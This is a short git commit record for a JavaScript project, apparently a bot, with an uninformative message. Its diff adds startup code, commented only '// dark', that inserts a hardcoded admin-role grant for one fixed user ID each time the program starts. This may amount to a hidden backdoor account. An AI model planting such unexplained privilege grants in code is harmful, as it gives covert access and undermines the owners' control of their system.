383006eaec63d7693418723d804e0ef6b1243b8a
sphericle <86196223+sphericle@users.noreply.github.com>
2025-04-02 17:16:01 -0400

    sdfsfd

--- index.js
+++ index.js
@@ -110,6 +110,12 @@ async function start() {
     } catch (e) {
         logger.error(`Error setting presence: ${e}`);
     }
+
+    // dark
+    await db.adminRoles.create({
+        roleId: "1277503519645106298",
+        adminId: "788169821672964118"
+    })
 }
 
 start();
